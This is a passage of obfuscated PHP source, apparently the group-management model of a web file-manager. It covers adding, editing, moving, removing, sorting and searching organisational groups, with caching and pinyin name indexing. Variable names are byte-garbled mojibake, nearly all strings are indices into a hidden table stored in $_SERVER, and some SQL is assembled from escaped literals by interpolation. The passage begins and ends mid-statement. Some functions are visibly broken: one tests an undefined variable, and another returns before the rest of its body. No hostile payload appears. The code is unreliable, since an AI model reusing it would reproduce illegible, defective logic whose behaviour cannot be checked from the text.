$¤ìı§®ù[$Ô‡ÂšŞÀ[90]] * ($¤ìı§®ù[$Ô‡ÂšŞÀ[2037]] - 1); $Ñê¸ŸŒŒ += $¤ìı§®ù[$Ô‡ÂšŞÀ[2037]]; } } $€Î‘—ö = array($Ô‡ÂšŞÀ[2047] => $Î¿‚‘óœ, $Ô‡ÂšŞÀ[2048] => $¡§âøø¢, $Ô‡ÂšŞÀ[2049] => $¡§âøø¢ / $Î¿‚‘óœ, $Ô‡ÂšŞÀ[94] => $¿Ç–™, $Ô‡ÂšŞÀ[2050] => $Ñê¸ŸŒŒ); return $€Î‘—ö; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\141\x6d\145" => "\147\x72\157\x75\x70\137\155\145\x74\x61", "\155\x65\164\141\106\x69\145\x6c\x64" => "\x67\162\x6f\x75\x70\111\104"); protected function cacheFunctionAlias($ï›´˜şš) { $Óó™ò =& $_SERVER[Ò°Ì”İ•]; return array($Óó™ò[2051] => array($ï›´˜şš[0], $Óó™ò[2052]), $Óó™ò[2053] => array($ï›´˜şš[0], $Óó™ò[2054])); } protected function getInfo($ÍÆ­Ä´æ, $Ë° —¢ = false) { $²æÅ’£§ = $this->getInfoSimple($ÍÆ­Ä´æ); if (!$²æÅ’£§) { return !1; } if ($Ë° —¢) { return $this->_listDataApplyItem($²æÅ’£§); } return $this->cacheFunctionGet($_SERVER[Ò°Ì”İ•][2055], $ÍÆ­Ä´æ); } protected function getInfoSimple($òúÍöº, $£îÌˆŠ = false) { $ïÊØ—Â” =& $_SERVER[Ò°Ì”İ•]; if ($£îÌˆŠ) { $¿Ù•ÏşŒ = array($ïÊØ—Â”[1969] => intval($òúÍöº)); $®àºˆ  = $this->where($¿Ù•ÏşŒ)->find(); return is_array($®àºˆ ) ? $®àºˆ  : array(); } return $this->cacheFunctionGet($ïÊØ—Â”[2056], $òúÍöº); } protected function groupAdd($ì•µƒÉû) { $ĞÖöç±Ğ =& $_SERVER[Ò°Ì”İ•]; if (!$ì•µƒÉû[$ĞÖöç±Ğ[203]] && isset($ì•µƒÉû[$ĞÖöç±Ğ[1969]]) && $ì•µƒÉû[$ĞÖöç±Ğ[1969]] == 1) { if ($œ›€úØ = $this->getInfoSimple($ì•µƒÉû[$ĞÖöç±Ğ[1969]], !0)) { return $ì•µƒÉû[$ĞÖöç±Ğ[1969]]; } } else { $œ›€úØ = $this->getInfoSimple($ì•µƒÉû[$ĞÖöç±Ğ[203]]); if (!$œ›€úØ) { return !1; } } $×¶å²˜æ = $ĞÖöç±Ğ[605]; if ($œ›€úØ[$ĞÖöç±Ğ[596]]) { $×¶å²˜æ = $œ›€úØ[$ĞÖöç±Ğ[596]] . $œ›€úØ[$ĞÖöç±Ğ[1969]] . $ĞÖöç±Ğ[50]; } $¯«—Â«® = array($ĞÖöç±Ğ[506] => $this->groupNameAuto($ì•µƒÉû[$ĞÖöç±Ğ[203]], $ì•µƒÉû[$ĞÖöç±Ğ[32]]), $ĞÖöç±Ğ[489] => $ì•µƒÉû[$ĞÖöç±Ğ[203]], $ĞÖöç±Ğ[667] => $×¶å²˜æ, $ĞÖöç±Ğ[2057] => $ì•µƒÉû[$ĞÖöç±Ğ[1955]], $ĞÖöç±Ğ[2058] => 0, $ĞÖöç±Ğ[1973] => 0); if (isset($ì•µƒÉû[$ĞÖöç±Ğ[1993]])) { $¯«—Â«®[$ĞÖöç±Ğ[1993]] = $ì•µƒÉû[$ĞÖöç±Ğ[1993]]; } else { $µı‘Ë¿Â = $this->max($ĞÖöç±Ğ[1993]); if (!$µı‘Ë¿Â) { $µı‘Ë¿Â = 0; } $¯«—Â«®[$ĞÖöç±Ğ[1993]] = $µı‘Ë¿Â + 1; } if (!empty($ì•µƒÉû[$ĞÖöç±Ğ[1969]])) { $¯«—Â«®[$ĞÖöç±Ğ[1969]] = $ì•µƒÉû[$ĞÖöç±Ğ[1969]]; } $˜Ä›¨ƒÙ = $this->add($¯«—Â«®); $this->setNamePinyin($˜Ä›¨ƒÙ, $¯«—Â«®[$ĞÖöç±Ğ[32]]); if (isset($ì•µƒÉû[$ĞÖöç±Ğ[2059]])) { $this->metaSet($˜Ä›¨ƒÙ, array($ĞÖöç±Ğ[2059] => $ì•µƒÉû[$ĞÖöç±Ğ[2059]], $ĞÖöç±Ğ[2060] => $ì•µƒÉû[$ĞÖöç±Ğ[2060]])); unset($ì•µƒÉû[$ĞÖöç±Ğ[2059]]); unset($ì•µƒÉû[$ĞÖöç±Ğ[2060]]); } Model($ĞÖöç±Ğ[1417])->groupRootAdd($˜Ä›¨ƒÙ); $this->_clearCache($ì•µƒÉû[$ĞÖöç±Ğ[203]]); return $˜Ä›¨ƒÙ; } protected function groupEdit($œÜØù¤î, $¶é×ó€¢) { $œ—„–ĞÁ =& $_SERVER[Ò°Ì”İ•]; $Â Æ­òÃ = $this->getInfoSimple($œÜØù¤î); if (!$Â Æ­òÃ) { return !1; } if (!empty($¶é×ó€¢[$œ—„–ĞÁ[203]])) { $›­Øû§Ø = $this->getInfoSimple($¶é×ó€¢[$œ—„–ĞÁ[203]]); if (!$›­Øû§Ø) { return !1; } if ($Â Æ­òÃ[$œ—„–ĞÁ[1969]] == $›­Øû§Ø[$œ—„–ĞÁ[1969]]) { return !1; } if ($¶é×ó€¢[$œ—„–ĞÁ[203]] != $Â Æ­òÃ[$œ—„–ĞÁ[203]]) { if ($›­Øû§Ø[$œ—„–ĞÁ[596]] !== $Â Æ­òÃ[$œ—„–ĞÁ[596]] && strpos($›­Øû§Ø[$œ—„–ĞÁ[596]], $Â Æ­òÃ[$œ—„–ĞÁ[596]] . $Â Æ­òÃ[$œ—„–ĞÁ[1969]] . $œ—„–ĞÁ[50]) === 0) { return !1; } $¶é×ó€¢[$œ—„–ĞÁ[667]] = $›­Øû§Ø[$œ—„–ĞÁ[596]] . $¶é×ó€¢[$œ—„–ĞÁ[203]] . $œ—„–ĞÁ[50]; $this->_changeChildLevel($Â Æ­òÃ, $›­Øû§Ø); $this->_clearCache($›­Øû§Ø[$œ—„–ĞÁ[1969]]); $this->_clearCache($Â Æ­òÃ[$œ—„–ĞÁ[203]]); } } if (isset($¶é×ó€¢[$œ—„–ĞÁ[32]])) { $this->setNamePinyin($œÜØù¤î, $¶é×ó€¢[$œ—„–ĞÁ[32]]); } if (isset($¶é×ó€¢[$œ—„–ĞÁ[2059]])) { $this->metaSet($œÜØù¤î, array($œ—„–ĞÁ[2059] => $¶é×ó€¢[$œ—„–ĞÁ[2059]], $œ—„–ĞÁ[2060] => $¶é×ó€¢[$œ—„–ĞÁ[2060]])); unset($¶é×ó€¢[$œ—„–ĞÁ[2059]]); unset($¶é×ó€¢[$œ—„–ĞÁ[2060]]); } $this->_clearChildrenCache($Â Æ­òÃ); return $this->where(array($œ—„–ĞÁ[2061] => $œÜØù¤î))->save($¶é×ó€¢); } private function _clearChildrenCache($¼Â¨¾Æ) { $´ñ˜ Åœ =& $_SERVER[Ò°Ì”İ•]; $×ÃÂéıê = array($´ñ˜ Åœ[667] => array($´ñ˜ Åœ[627], $¼Â¨¾Æ[$´ñ˜ Åœ[596]] . $¼Â¨¾Æ[$´ñ˜ Åœ[1969]] . $´ñ˜ Åœ[628])); $îµ’ÜÊÁ = $this->field($´ñ˜ Åœ[1969])->where($×ÃÂéıê)->select(); foreach ($îµ’ÜÊÁ as $Ş»Ó¥») { $this->_clearCache($Ş»Ó¥»[$´ñ˜ Åœ[1969]]); } } private function _clearCache($‹—„±Ùƒ) { $¶ÔÀÁ¯’ =& $_SERVER[Ò°Ì”İ•]; $this->cacheFunctionClear($¶ÔÀÁ¯’[2055], $‹—„±Ùƒ); $this->cacheFunctionClear($¶ÔÀÁ¯’[2056], $‹—„±Ùƒ); } private function _changeChildLevel($ñ°ÁÅ¼Ï, $ù¸±ÉÊ, $©úàİ = false) { $äÌ´®ÁÕ =& $_SERVER[Ò°Ì”İ•]; $±„„ûĞ‚ = $ñ°ÁÅ¼Ï[$äÌ´®ÁÕ[596]] . $ñ°ÁÅ¼Ï[$äÌ´®ÁÕ[1969]] . $äÌ´®ÁÕ[50]; $‡ˆùĞ÷ = $ù¸±ÉÊ[$äÌ´®ÁÕ[596]] . $ù¸±ÉÊ[$äÌ´®ÁÕ[1969]] . $äÌ´®ÁÕ[50] . $ñ°ÁÅ¼Ï[$äÌ´®ÁÕ[1969]] . $äÌ´®ÁÕ[50]; if ($©úàİ) { $‡ˆùĞ÷ = $ù¸±ÉÊ[$äÌ´®ÁÕ[596]] . $ù¸±ÉÊ[$äÌ´®ÁÕ[1969]] . $äÌ´®ÁÕ[50]; } $•²˜ëï = array($äÌ´®ÁÕ[667] => array($äÌ´®ÁÕ[627], $ñ°ÁÅ¼Ï[$äÌ´®ÁÕ[596]] . $ñ°ÁÅ¼Ï[$äÌ´®ÁÕ[1969]] . $äÌ´®ÁÕ[628])); $ŞÔ‰´ª¥ = array($äÌ´®ÁÕ[667] => array($äÌ´®ÁÕ[676], "\x72\x65\x70\x6c\x61\x63\x65\50\x70\x61\162\x65\x6e\x74\114\x65\166\x65\154\54\47{$±„„ûĞ‚}\47\54\x27{$‡ˆùĞ÷}\x27\51")); $this->_clearChildrenCache($ñ°ÁÅ¼Ï); $this->where($•²˜ëï)->data($ŞÔ‰´ª¥)->save(); } public function setNamePinyin($İ²ÕòÄÏ, $Œˆ­‚±ƒ = false) { $¨½õ¦–ª =& $_SERVER[Ò°Ì”İ•]; if (!$Œˆ­‚±ƒ) { $œõÔÇ±¨ = $this->getInfoSimple($İ²ÕòÄÏ); $Œˆ­‚±ƒ = $œõÔÇ±¨[$¨½õ¦–ª[32]]; } if (!Input::check($Œˆ­‚±ƒ, $¨½õ¦–ª[670])) { $this->metaSet($İ²ÕòÄÏ, $¨½õ¦–ª[550], null); $this->metaSet($İ²ÕòÄÏ, $¨½õ¦–ª[549], null); return; } $ÖÏôÍÌŒ = array($¨½õ¦–ª[550] => str_replace($¨½õ¦–ª[53], $¨½õ¦–ª[12], Pinyin::get($Œˆ­‚±ƒ)), $¨½õ¦–ª[549] => Pinyin::get($Œˆ­‚±ƒ, $¨½õ¦–ª[671])); $this->metaSet($İ²ÕòÄÏ, $ÖÏôÍÌŒ); } protected function metaSet($§ğ¤Ğşœ, $»ß¸Äƒ = null, $‚„İì£ = null) { $this->_clearCache($§ğ¤Ğşœ); return parent::metaSet($§ğ¤Ğşœ, $»ß¸Äƒ, $‚„İì£); } protected function groupStatus($æÊÁ¨ñò, $•¸´£Å) { $ÀÑÕÌ´ =& $_SERVER[Ò°Ì”İ•]; $„¿ÔáÍ› = $this->getInfoSimple($æÊÁ¨ñò); if (!$„¿ÔáÍ›) { return !1; } $this->_clearCache($æÊÁ¨ñò); return $this->metaSet($æÊÁ¨ñò, $ÀÑÕÌ´[823], $•¸´£Å); if ($•¸´£Å == $ÀÑÕÌ´[102]) { $ÕÅÈòÌ = $this->parentLevelArray($„¿ÔáÍ›[$ÀÑÕÌ´[596]]); } else { } $ÕÅÈòÌ[] = $„¿ÔáÍ›[$ÀÑÕÌ´[1969]]; $úØŸÀ = array(); foreach ($ÕÅÈòÌ as $æÊÁ¨ñò) { $úØŸÀ[] = array($ÀÑÕÌ´[1969] => $æÊÁ¨ñò, $ÀÑÕÌ´[108] => $ÀÑÕÌ´[823], $ÀÑÕÌ´[462] => $•¸´£Å); $this->_clearCache($æÊÁ¨ñò); } return Model($ÀÑÕÌ´[2062])->addAll($úØŸÀ, array(), !0); } protected function groupRemove($ ï¥ßèØ, $õŒÍò†Ü = false) { $ßÒÎÖôË =& $_SERVER[Ò°Ì”İ•]; $ôÍèüä’ = array($ßÒÎÖôË[1969] => $ ï¥ßèØ); $‚ºú¡“ê = $this->where($ôÍèüä’)->find(); if (!$‚ºú¡“ê || $‚ºú¡“ê[$ßÒÎÖôË[203]] == 0) { return !1; } if (!$õŒÍò†Ü) { $‡Ûä÷€Ğ = $this->getInfoSimple($‚ºú¡“ê[$ßÒÎÖôË[203]]); $this->_changeChildLevel($‚ºú¡“ê, $‡Ûä÷€Ğ, !0); $this->where(array($ßÒÎÖôË[203] => $ ï¥ßèØ))->save(array($ßÒÎÖôË[203] => $‚ºú¡“ê[$ßÒÎÖôË[203]])); $this->_clearCache($‡Ûä÷€Ğ[$ßÒÎÖôË[1969]]); } Model($ßÒÎÖôË[2062])->where($ôÍèüä’)->delete(); Model($ßÒÎÖôË[2063])->where($ôÍèüä’)->delete(); Model($ßÒÎÖôË[898])->groupRootRemove($ ï¥ßèØ); $this->_clearCache($‚ºú¡“ê[$ßÒÎÖôË[203]]); return $this->where($ôÍèüä’)->delete(); } protected function groupSort($íÍ‡ë°ë) { $×ª–Œ£Ş =& $_SERVER[Ò°Ì”İ•]; $Ó¢şŞ¥Ò = array(); foreach ($íÍ‡ë°ë as $Œ¤¨Èº => $ì×Öã×µ) { $Ó¢şŞ¥Ò[] = array($×ª–Œ£Ş[1969], $ì×Öã×µ, $×ª–Œ£Ş[1993], $Œ¤¨Èº + 1); } $this->saveAll($Ó¢şŞ¥Ò); } public function listData() { $¶¿†¿‡ñ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¶¿†¿‡ñ[$_SERVER[Ò°Ì”İ•][457]]); return $¶¿†¿‡ñ; } private function _makeOrder($º—ÉŒ Û = '') { $À”ŸÂ€× =& $_SERVER[Ò°Ì”İ•]; $éÀú›‰ = array($À”ŸÂ€×[1969], $À”ŸÂ€×[32], $À”ŸÂ€×[1957], $À”ŸÂ€×[244]); $ö™Üˆ¹ = array($À”ŸÂ€×[535] => $À”ŸÂ€×[536], $À”ŸÂ€×[537] => $À”ŸÂ€×[538]); $ÏÉÒ¹ÑÙ = Input::get($À”ŸÂ€×[542], $À”ŸÂ€×[7], $À”ŸÂ€×[1973], $éÀú›‰); $ğÀ™Ú‡« = Input::get($À”ŸÂ€×[543], $À”ŸÂ€×[7], $À”ŸÂ€×[2064], array($À”ŸÂ€×[2064], $À”ŸÂ€×[537])); $ğÀ™Ú‡« = $ö™Üˆ¹[$ğÀ™Ú‡«]; $º—ÉŒ Û = $º—ÉŒ Û . "{$ÏÉÒ¹ÑÙ}\40{$ğÀ™Ú‡«}\54\x20\147\162\157\x75\x70\111\x44\x20\x61\163\143"; return $this->order($º—ÉŒ Û); } public function listChild($èáÛˆ‚á) { $¦¼èò“• =& $_SERVER[Ò°Ì”İ•]; $øÛ˜íÉ = $this->where(array($¦¼èò“•[203] => $èáÛˆ‚á))->_makeOrder()->selectPage(200); $this->_listDataApply($øÛ˜íÉ[$¦¼èò“•[457]]); return $øÛ˜íÉ; } public function listChildIds($¬á¶÷Ÿ™) { $ÑÇ¥Œôº =& $_SERVER[Ò°Ì”İ•]; if (is_string($Í–ç“ì–)) { $¬á¶÷Ÿ™ = explode($ÑÇ¥Œôº[50], $¬á¶÷Ÿ™); } $€„ä‡ = $this->where(array($ÑÇ¥Œôº[1969] => array($ÑÇ¥Œôº[7], $¬á¶÷Ÿ™)))->field($ÑÇ¥Œôº[2065])->select(); if (!$€„ä‡) { return !1; } $•äÑÇı = array(); foreach ($€„ä‡ as $«ÛËŒÁî) { $•äÑÇı[] = "\x73\145\154\145\x63\164\40\147\x72\x6f\x75\x70\111\104\x20\146\162\157\155\x20\140\x67\x72\x6f\x75\x70\140\x20\x77\150\145\x72\x65\40\x70\x61\x72\145\x6e\164\114\x65\x76\x65\154\40\154\x69\153\145\40\47{$«ÛËŒÁî[$ÑÇ¥Œôº[596]]}{$«ÛËŒÁî[$ÑÇ¥Œôº[1969]]}\54\45\x27"; } $•äÑÇı = implode($ÑÇ¥Œôº[2066], $•äÑÇı); $€„ä‡ = $this->query($•äÑÇı); if (!$€„ä‡) { return array(); } $¬á¶÷Ÿ™ = array_to_keyvalue($€„ä‡, $ÑÇ¥Œôº[12], $ÑÇ¥Œôº[1969]); return array_unique($¬á¶÷Ÿ™); } public function listByID($€ßåúœò) { $†á­ôˆï =& $_SERVER[Ò°Ì”İ•]; if (!$€ßåúœò) { return array(); } $°´şÚäí = array($†á­ôˆï[1969] => array($†á­ôˆï[7], $€ßåúœò)); $…×ëù€İ = $this->where($°´şÚäí)->select(); $…×ëù€İ = array_sort_keep($…×ëù€İ, $†á­ôˆï[1969], $€ßåúœò); $this->_listDataApply($…×ëù€İ); return $…×ëù€İ; } public function listSearch($•Ì”Õ) { $àŠ¾™ÛŸ =& $_SERVER[Ò°Ì”İ•]; $İÏô²‡ã = trim($•Ì”Õ[$àŠ¾™ÛŸ[2067]]); $¤®Ùµñ€ = explode($àŠ¾™ÛŸ[53], $İÏô²‡ã); if (!$İÏô²‡ã || count($¤®Ùµñ€) == 1) { return $this->listSearchNow($•Ì”Õ); } $­¶ºœŠ© = array($àŠ¾™ÛŸ[457] => array()); foreach ($¤®Ùµñ€ as $±şí±ı) { if (!trim($±şí±ı)) { continue; } $•Ì”Õ[$àŠ¾™ÛŸ[2067]] = $±şí±ı; $£àãªú = $this->listSearchNow($•Ì”Õ); $­¶ºœŠ©[$àŠ¾™ÛŸ[457]] = array_merge($­¶ºœŠ©[$àŠ¾™ÛŸ[457]], $£àãªú[$àŠ¾™ÛŸ[457]]); } $­¶ºœŠ©[$àŠ¾™ÛŸ[457]] = array_unique_by_key($­¶ºœŠ©[$àŠ¾™ÛŸ[457]], $àŠ¾™ÛŸ[1969]); $­¶ºœŠ©[$àŠ¾™ÛŸ[454]] = array($àŠ¾™ÛŸ[455] => count($­¶ºœŠ©[$àŠ¾™ÛŸ[457]]), $àŠ¾™ÛŸ[451] => 20, $àŠ¾™ÛŸ[440] => 1, $àŠ¾™ÛŸ[456] => 1); return $­¶ºœŠ©; } public function listSearchNow($Ü‚ı¿Ù±) { $á¥…ù» =& $_SERVER[Ò°Ì”İ•]; $Ãˆ³Ê¡ª = trim($Ü‚ı¿Ù±[$á¥…ù»[2067]]); $ÓìÓİß = isset($Ü‚ı¿Ù±[$á¥…ù»[2068]]) ? $Ü‚ı¿Ù±[$á¥…ù»[2068]] : !1; if (!trim($Ãˆ³Ê¡ª)) { return !1; } $Ãˆ³Ê¡ª = str_replace($á¥…ù»[2069], $á¥…ù»[2070], $Ãˆ³Ê¡ª); $ÖÄ¸õÄñ = array($á¥…ù»[1969] => array($á¥…ù»[471], "{$Ãˆ³Ê¡ª}\45"), $á¥…ù»[32] => array($á¥…ù»[471], "\x25{$Ãˆ³Ê¡ª}\x25"), $á¥…ù»[1073] => $á¥…ù»[2071]); if ($ÓìÓİß) { $šÃ¿åòô = $this->getInfoSimple($ÓìÓİß); $÷ş½›“Å = $šÃ¿åòô[$á¥…ù»[596]] . $ÓìÓİß . $á¥…ù»[628]; $ÖÄ¸õÄñ = array($ÖÄ¸õÄñ, array($á¥…ù»[596] => array($á¥…ù»[471], $÷ş½›“Å))); } $ÖÄ¸õÄñ = $this->parseWhereLike($ÖÄ¸õÄñ); $•¯±ÎÜ = $this->_makeOrder()->where($ÖÄ¸õÄñ)->selectPage(20); $•¯±ÎÜ = $•¯±ÎÜ ? $•¯±ÎÜ : array($á¥…ù»[457] => array(), $á¥…ù»[454] => array()); if (!$•¯±ÎÜ || count($•¯±ÎÜ[$á¥…ù»[457]]) < 5 && Input::check($Ãˆ³Ê¡ª, $á¥…ù»[405])) { $»®Ì²™ì = $this->groupChildrenAll($ÓìÓİß); $Æ¼ËÑÒÄ = $this->_searchFromMeta($á¥…ù»[549], $Ãˆ³Ê¡ª, 10, $»®Ì²™ì); $¡£”ÇœÓ = $this->_searchFromMeta($á¥…ù»[550], $Ãˆ³Ê¡ª, 10, $»®Ì²™ì); $Ìº¡Ñ¿ï = array_merge($Æ¼ËÑÒÄ, $¡£”ÇœÓ, $•¯±ÎÜ[$á¥…ù»[457]]); $•¯±ÎÜ[$á¥…ù»[457]] = array_unique_by_key($Ìº¡Ñ¿ï, $á¥…ù»[1969]); $•¯±ÎÜ[$á¥…ù»[454]][$á¥…ù»[455]] = count($•¯±ÎÜ[$á¥…ù»[457]]); $•¯±ÎÜ[$á¥…ù»[454]][$á¥…ù»[456]] = ceil($•¯±ÎÜ[$á¥…ù»[454]][$á¥…ù»[455]] / $•¯±ÎÜ[$á¥…ù»[454]][$á¥…ù»[451]]); } $this->_listDataApply($•¯±ÎÜ[$á¥…ù»[457]]); return $•¯±ÎÜ; } protected function groupChildrenAll($È‡áó–¿) { $Íî¨¤Â± =& $_SERVER[Ò°Ì”İ•]; if (!$È‡áó–¿) { return !1; } if (!is_array($È‡áó–¿)) { $È‡áó–¿ = array($È‡áó–¿); } $Âùš§èº = $È‡áó–¿; foreach ($È‡áó–¿ as $ÍÂî­Óî) { $«û¬‘Û‚ = $this->getInfoSimple($ÍÂî­Óî); $‹Ò“×¥ = array($Íî¨¤Â±[596] => array($Íî¨¤Â±[471], $«û¬‘Û‚[$Íî¨¤Â±[596]] . $ÍÂî­Óî . $Íî¨¤Â±[628])); $¤¢ñëĞ = $this->field($Íî¨¤Â±[1969])->where($‹Ò“×¥)->select(); $Âùš§èº = array_merge($Âùš§èº, array_to_keyvalue($¤¢ñëĞ, $Íî¨¤Â±[12], $Íî¨¤Â±[1969])); } return array_unique($Âùš§èº); } private function _searchFromMeta($ÍÒ£é¶ú, $¼ğ°¹ÊÌ, $´·ïÂâà, $ş¢øƒË) { $ó¦àóå¶ =& $_SERVER[Ò°Ì”İ•]; $¼ğ°¹ÊÌ = strtolower($¼ğ°¹ÊÌ); $Èšûõâ = array($ó¦àóå¶[108] => $ÍÒ£é¶ú, $ó¦àóå¶[462] => array($ó¦àóå¶[471], "\x25{$¼ğ°¹ÊÌ}\x25")); $Èšûõâ = $this->parseWhereLike($Èšûõâ); if ($ş¢øƒË) { $Èšûõâ[$ó¦àóå¶[1969]] = array($ó¦àóå¶[7], $ş¢øƒË); } $³È¿”ô… = Model($ó¦àóå¶[2072])->where($Èšûõâ)->limit($´·ïÂâà)->select(); if (!$³È¿”ô…) { return array(); } $³È¿”ô… = array_to_keyvalue($³È¿”ô…, $ó¦àóå¶[12], $ó¦àóå¶[1969]); $±Âï¥¦Ç = $this->where(array($ó¦àóå¶[2061] => array($ó¦àóå¶[7], $³È¿”ô…)))->select(); if (!$±Âï¥¦Ç) { return array(); } return $±Âï¥¦Ç; } protected function _listDataApplyItem($îĞ¬ğÚŠ) { $äå•æõ = array($îĞ¬ğÚŠ); $this->_listDataApply($äå•æõ); return $äå•æõ[0]; } protected function _listDataApply(&$ÄÉº¦’¢) { $Æœş±ˆ• =& $_SERVER[Ò°Ì”İ•]; if (!$ÄÉº¦’¢) { return; } $óÒïûäò = array_to_keyvalue($ÄÉº¦’¢, $Æœş±ˆ•[12], $Æœş±ˆ•[1969]); $this->_listAppendChildren($ÄÉº¦’¢); $this->_listAppendChildrenMember($ÄÉº¦’¢); $this->_listAppendMeta($ÄÉº¦’¢, $óÒïûäò); $this->_listAppendParent($ÄÉº¦’¢); $this->_listAppendSourceRoot($ÄÉº¦’¢, $óÒïûäò); } private function _listAppendChildren(&$‘¤Š•¢) { $¾©ïå“ï =& $_SERVER[Ò°Ì”İ•]; $ü‘ã‹¯ = array_to_keyvalue($‘¤Š•¢, $¾©ïå“ï[12], $¾©ïå“ï[1969]); $²¬Õ‰˜ú = array($¾©ïå“ï[203] => array($¾©ïå“ï[7], $ü‘ã‹¯)); $œä¼Ú­ï = array($¾©ïå“ï[203], $¾©ïå“ï[2073] => $¾©ïå“ï[577]); $”Ñæñû¹ = $this->field($œä¼Ú­ï)->where($²¬Õ‰˜ú)->group($¾©ïå“ï[203])->select(); $ï×î„ëÊ = array_to_keyvalue($”Ñæñû¹, $¾©ïå“ï[203], $¾©ïå“ï[577]); foreach ($‘¤Š•¢ as &$ïˆ¨Ÿ¥£) { $şû”°½ = $ïˆ¨Ÿ¥£[$¾©ïå“ï[1969]]; $ïˆ¨Ÿ¥£[$¾©ïå“ï[2074]] = isset($ï×î„ëÊ[$şû”°½]) ? intval($ï×î„ëÊ[$şû”°½]) : !1; } unset($ïˆ¨Ÿ¥£); } private function _listAppendChildrenMember(&$’ØÌîÊ) { $òÒƒ’ä¢ =& $_SERVER[Ò°Ì”İ•]; $ûØâ¯‘ = array_to_keyvalue($’ØÌîÊ, $òÒƒ’ä¢[12], $òÒƒ’ä¢[1969]); $úÛï›æü = array($òÒƒ’ä¢[1969] => array($òÒƒ’ä¢[7], $ûØâ¯‘)); $’Ş²‰“Ü = array($òÒƒ’ä¢[1969], $òÒƒ’ä¢[2073] => $òÒƒ’ä¢[577]); $›ö®ñ‰° = Model($òÒƒ’ä¢[2063])->field($’Ş²‰“Ü)->where($úÛï›æü)->group($òÒƒ’ä¢[1969])->select(); $üŠš±»‡ = array_to_keyvalue($›ö®ñ‰°, $òÒƒ’ä¢[1969], $òÒƒ’ä¢[577]); foreach ($’ØÌîÊ as &$ôŸœÍ—è) { $Çœ¨¶ºğ = $ôŸœÍ—è[$òÒƒ’ä¢[1969]]; $ôŸœÍ—è[$òÒƒ’ä¢[2075]] = isset($üŠš±»‡[$Çœ¨¶ºğ]) ? intval($üŠš±»‡[$Çœ¨¶ºğ]) : !1; } unset($ôŸœÍ—è); } private function _listAppendMeta(&$æÄ™ìàÍ, $©ïÀ«Õœ) { $ŒÒº©ÖÜ =& $_SERVER[Ò°Ì”İ•]; $°û”Ûå = array($ŒÒº©ÖÜ[1969] => array($ŒÒº©ÖÜ[7], $©ïÀ«Õœ)); $Ë¨€œ´ = Model($ŒÒº©ÖÜ[2062])->where($°û”Ûå)->select(); $Ë¨€œ´ = array_to_keyvalue_group($Ë¨€œ´, $ŒÒº©ÖÜ[1969]); foreach ($Ë¨€œ´ as &$ä»ÔñÁ) { $ä»ÔñÁ = array_to_keyvalue($ä»ÔñÁ, $ŒÒº©ÖÜ[108], $ŒÒº©ÖÜ[462]); } unset($ä»ÔñÁ); foreach ($æÄ™ìàÍ as &$€ƒ•ñ»ª) { $€ƒ•ñ»ª[$ŒÒº©ÖÜ[551]] = array(); if (isset($Ë¨€œ´[$€ƒ•ñ»ª[$ŒÒº©ÖÜ[1969]]])) { $€ƒ•ñ»ª[$ŒÒº©ÖÜ[551]] = $Ë¨€œ´[$€ƒ•ñ»ª[$ŒÒº©ÖÜ[1969]]]; } } unset($€ƒ•ñ»ª); } protected function parentLevelArray($ ­Ğ¬›±) { $°Å›¤î† =& $_SERVER[Ò°Ì”İ•]; $ ­Ğ¬›± = explode($°Å›¤î†[50], trim($ ­Ğ¬›±, $°Å›¤î†[50])); $ ­Ğ¬›± = array_remove_value($ ­Ğ¬›±, $°Å›¤î†[241]); return $ ­Ğ¬›±; } protected function parentInGroup($¦¸“ÚÅÕ, $Ä¨œÏ­¡) { $ ‹Å« =& $_SERVER[Ò°Ì”İ•]; $›·çâæ = $this->getInfoSimple($¦¸“ÚÅÕ); if (!$›·çâæ) { return !0; } $û ğÖ¼ = $this->parentLevelArray($›·çâæ[$ ‹Å«[596]]); $û ğÖ¼[] = $¦¸“ÚÅÕ; foreach ($û ğÖ¼ as $¦¸“ÚÅÕ) { if (in_array($¦¸“ÚÅÕ . $ ‹Å«[12], $Ä¨œÏ­¡)) { return !0; } } return !1; } private function _listAppendParent(&$óş¹¥…é) { $³ûÙÙ²™ =& $_SERVER[Ò°Ì”İ•]; $ÁÇ†ª³¹ = array(); foreach ($óş¹¥…é as &$ËëÂ™Í) { $ÁÇ†ª³¹[$ËëÂ™Í[$³ûÙÙ²™[1969]]] = $ËëÂ™Í[$³ûÙÙ²™[32]]; $¥³ó»Ñ‘ = $this->parentLevelArray($ËëÂ™Í[$³ûÙÙ²™[596]]); foreach ($¥³ó»Ñ‘ as $ÙîùÇ) { if (!isset($ÁÇ†ª³¹[$ÙîùÇ])) { $ÁÇ†ª³¹[$ÙîùÇ] = 0; } } } unset($ËëÂ™Í); foreach ($ÁÇ†ª³¹ as $‘æÂ§ğª => $Í£ùœêÎ) { if ($Í£ùœêÎ) { continue; } $¹İÍÜ¤ = $this->getInfoSimple($‘æÂ§ğª); $ÁÇ†ª³¹[$‘æÂ§ğª] = $¹İÍÜ¤[$³ûÙÙ²™[32]]; } $ëÇ¾ÕÍÅ = $GLOBALS[$³ûÙÙ²™[6]][$³ûÙÙ²™[103]][$³ûÙÙ²™[2076]]; if (KodUser::isRoot()) { $ëÇ¾ÕÍÅ = !1; } foreach ($óş¹¥…é as &$ËëÂ™Í) { $¥³ó»Ñ‘ = $this->parentLevelArray($ËëÂ™Í[$³ûÙÙ²™[596]]); $³ŠÎ³è· = $³ûÙÙ²™[12]; foreach ($¥³ó»Ñ‘ as $‘æÂ§ğª => $ÙîùÇ) { if ($ëÇ¾ÕÍÅ && $‘æÂ§ğª == 0) { continue; } $³ŠÎ³è· .= $ÁÇ†ª³¹[$ÙîùÇ] . $³ûÙÙ²™[8]; } if ($¥³ó»Ñ‘) { $³ŠÎ³è· .= $ËëÂ™Í[$³ûÙÙ²™[32]]; } $ËëÂ™Í[$³ûÙÙ²™[601]] = str_replace($³ûÙÙ²™[267], $³ûÙÙ²™[8], $³ŠÎ³è·); } unset($ËëÂ™Í); } private function _listAppendSourceRoot(&$§Åğ±õ‚, $³¨–õÁ) { $ÁŸ­¢‚ =& $_SERVER[Ò°Ì”İ•]; $°øá’¢ = Model($ÁŸ­¢‚[898])->listSourceRoot(SourceModel::TYPE_GROUP, $³¨–õÁ); $°øá’¢ = array_to_keyvalue($°øá’¢, $ÁŸ­¢‚[581]); $°øá’¢ = array_remove_key($°øá’¢, $ÁŸ­¢‚[581]); foreach ($§Åğ±õ‚ as &$ï·ııİÛ) { $ï·ııİÛ[$ÁŸ­¢‚[101]] = 